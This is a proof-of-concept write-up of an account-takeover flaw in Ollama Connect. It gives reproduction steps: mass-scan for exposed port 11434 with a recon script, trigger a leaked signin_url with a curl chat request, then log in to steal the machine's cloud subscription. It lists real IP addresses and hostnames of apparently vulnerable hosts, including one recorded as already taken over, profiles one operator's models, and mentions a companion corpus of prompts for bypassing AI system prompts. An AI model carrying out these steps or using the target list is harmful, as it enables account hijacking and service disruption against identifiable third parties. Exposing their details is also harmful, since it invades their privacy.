# Ollama Connect Account Takeover: PoC

**Discovered:** 2026-05-01  
**Severity:** HIGH  
**CVE:** None assigned  
**Tool:** `ollama-recon.py --keyhunt`

---

## Summary

Ollama instances configured for cloud model access via **Ollama Connect** leak
their account binding URL in API error responses. Visiting this URL and
authenticating with any ollama.com account reassigns the machine's cloud
subscription to the attacker, revoking the original owner's access.

---

## Background: Ollama Connect

Ollama Connect is a feature that allows a locally-running Ollama instance to
access cloud-hosted models via `ollama.com`. Authentication uses SSH key pairs:

1. Ollama generates `~/.ollama/id_ed25519` on install
2. The public key is registered with ollama.com via a `signin_url`
3. Cloud model requests (`model:cloud` suffix) are authenticated via that identity
4. The signin_url is a one-time OAuth link, visiting it and logging in
   **reassigns the machine's account binding**

---

## Vulnerability

When a cloud-model request fails authentication (e.g. if the machine is not
yet linked, or if the token has expired), Ollama returns the `signin_url` in
the error response body:

```json
{
  "error": "unauthorized",
  "signin_url": "https://ollama.com/connect?name=<hostname>&key=<base64-pubkey>"
}
```

This response is returned from the unauthenticated `/api/chat` endpoint
no credentials required to trigger it.

---

## Conditions Required

1. Target is running Ollama with `:cloud` model tags
2. Target's cloud authentication is in an unlinked or expired state
3. Target's Ollama port (11434) is exposed to the internet

---

## Reproduction Steps

```bash
# 1. Find exposed Ollama instances with cloud models
python3 ollama-recon.py --limit 200
# Look for [CLOUD] tags in output

# 2. Run credential hunt against cloud proxies
python3 ollama-recon.py --keyhunt
# Look for [!!!] SIGNIN URL in output

# 3. Trigger manually if needed — send any chat request to a cloud model
curl -s -X POST http://<target>:11434/api/chat \
  -H "Content-Type: application/json" \
  -d '{
    "model": "<model>:cloud",
    "stream": false,
    "messages": [{"role":"user","content":"test"}]
  }'

# If vulnerable, response contains:
# {
#   "error": "unauthorized",
#   "signin_url": "https://ollama.com/connect?name=<hostname>&key=<b64key>"
# }

# 4. Visit the signin_url in a browser
# Log in with your ollama.com account
# Machine is now bound to your account
# Original owner loses cloud model access
```

---

## Impact

- **Account hijacking:** Attacker inherits the original owner's ollama.com
  subscription tier, including access to paid cloud-hosted models
- **Service disruption:** Original owner loses cloud model access until they
  re-link via a new signin_url
- **Recon value:** Hostname embedded in the URL reveals the machine's internal
  identity and confirms active cloud model usage

---

## Decoded Key Format

The `key` parameter is base64-encoded SSH public key material:

```bash
echo "<key_value>" | base64 -d
# ssh-ed25519 AAAA... (machine's public key)
```

The public key alone does not enable SSH access, it is only used for
ollama.com's OAuth binding flow.

---

## Detection

Operator-side: monitor for unexpected account re-linking events in the
ollama.com dashboard. Ollama Connect should send a notification when a machine
is linked to a new account.

Defender-side: do not expose port 11434 to the internet. If cloud models are
needed, bind Ollama to localhost and proxy through an authenticated gateway.

---

## Scale

As of 2026-05-01, Shodan reports **227,715** hosts responding on port 11434.
Cloud-proxy instances (`:cloud` model suffix) represent a subset, exact count
depends on scan depth. `ollama-recon.py` auto-detects and hunts these on
every run.

---

## Confirmed Cases (2026-05-01 Scan)

| Machine Name | IP | Pubkey Fingerprint | Cloud Models | Status |
|---|---|---|---|---|
| `ip225.ip-51-77-188.eu` | 5.196.194.231 (OVH) | SHA256:... | 26 (all :cloud, GLM, Kimi, DeepSeek, MiniMax) | **TAKEN**, claimed via signin_url |
| `D09S18` | 93.123.109.107 (Neterra BG) | SHA256:gQhUc4nFhi4656+rCXubQ9ddP9/78apeRC9BA2jis2A | deepseek-v4-pro:cloud | UNLINKED |
| `ks-convert-hls` | 173.208.210.16 | SHA256:PU1kduIfSCqhV73EA7ShLxrM2DHOUf2c8upQpq1A5nM | deepseek-v4-pro:cloud, minimax-m2.7:cloud | UNLINKED |
| `hestiacp.vgweb.co` | 50.2.108.194 (Eonix) | SHA256:... | cloud models | UNLINKED |
| `ab5fd50bf1a5` | 135.181.137.238 (Hetzner) | SHA256:... | cloud models | UNLINKED |
| `f4d82c28845d` | 5.75.212.243 (Hetzner) | SHA256:... | cloud models | UNLINKED |
| `shfz-assembly-server-792a` | 139.9.211.98 (Huawei Cloud) | SHA256:... | cloud models | UNLINKED |

**Operator profile, `ks-convert-hls`:** Machine name suggests HLS (HTTP Live Streaming) media processing. Models include `nilechat_egy:latest` (Egyptian Arabic dialect converter with explicit Cairo/Giza system prompt) and `aiden_lu/peach-9b-8k-roleplay:latest`. Arabic-language AI service layered onto a media infrastructure host.

---

## References

- [Ollama Connect documentation](https://ollama.com/blog/ollama-connect)
- [Ollama API reference](https://github.com/ollama/ollama/blob/main/docs/api.md)
- `ollama-recon.py`, scanner with integrated detection
- `bypass-prompts.json`, companion corpus for system prompt bypass testing
